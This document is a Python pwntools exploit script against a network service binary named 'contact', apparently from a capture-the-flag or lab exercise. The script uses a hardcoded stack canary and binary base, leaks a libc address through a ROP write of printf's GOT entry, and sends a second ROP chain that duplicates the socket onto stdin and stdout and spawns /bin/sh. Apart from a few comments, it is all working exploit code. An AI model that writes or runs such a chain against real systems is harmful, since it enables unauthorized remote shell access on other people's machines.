#!/usr/bin/env python3

from pwn import *

# Remote exploit over SSH port-forward
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 1337

LIBC_BINARY = "x64_libc.so.6"   # Remote
#LIBC_BINARY = "/usr/lib/x86_64-linux-gnu/libc-2.29.so"  # Local

BINARY_PATH = "./contact"

# From dmesg on segfault - To get this, we first have to bruteforce canary
# Then segfault the process - Process won't segfault with bad canary
# Once we get he correct base from dmesg, we can just place it here to run
# the exploit for shell
BINARY_BASE = 0x0000555555554000

# [  590.668295] contact[3588]: segfault at 55555555564b ip 000055555555564b
# sp 00007ffddbe3d760 error 14 in contact[55c1a556f000+1000]
BINARY_BASE = 0x55c1a556f000

# Bruteforce - Use the script pwn3-brute.py
STACK_CANARY = 0x1bb2fca37b0c6c00

CLIENT_FD = 4
BUF_SPACE = 56

def exploit():
    context(arch = 'amd64', os = 'linux')

    binary = ELF(BINARY_PATH)
    binary.address = BINARY_BASE

    libc = ELF(LIBC_BINARY)

    # Leaker ROP
    rop = ROP(binary)
    rop.write(CLIENT_FD, binary.got["printf"], 8)

    print(rop.dump())

    # Leaking printf GOT address to compute LIBC_BASE
    payload = b'A' * BUF_SPACE
    payload += p64(STACK_CANARY)
    payload += p64(0x4142434441424344)  # RBP
    #payload += p64(0x4142434441424344)  # RIP
    payload += rop.chain()
    payload += p64(0x4142434441424344)

    r = remote(TARGET_HOST, TARGET_PORT)
    r.recv(1000)
    r.send(payload)
    res = r.recv(100)
    r.close()

    libc_addr = u64(res)
    libc_addr = libc_addr - libc.symbols["printf"]

    print("Leaked LIBC_BASE: ", hex(libc_addr))

    libc.address = libc_addr

    # ROP for shell
    rop = ROP(libc)
    rop.dup2(CLIENT_FD, 0)
    rop.dup2(CLIENT_FD, 1)
    rop.dup2(CLIENT_FD, 2)
    rop.system(next(libc.search(b"/bin/sh\x00")))
    rop.exit(0)

    print(rop.dump())

    payload = b'A' * BUF_SPACE
    payload += p64(STACK_CANARY)
    payload += p64(0x4142434441424344)  # RBP
    #payload += p64(0x4142434441424344)  # RIP
    payload += rop.chain()
    payload += p64(0x4142434441424344)

    r = remote(TARGET_HOST, TARGET_PORT)
    r.recv(1000)
    r.send(payload)
    r.interactive()

exploit()
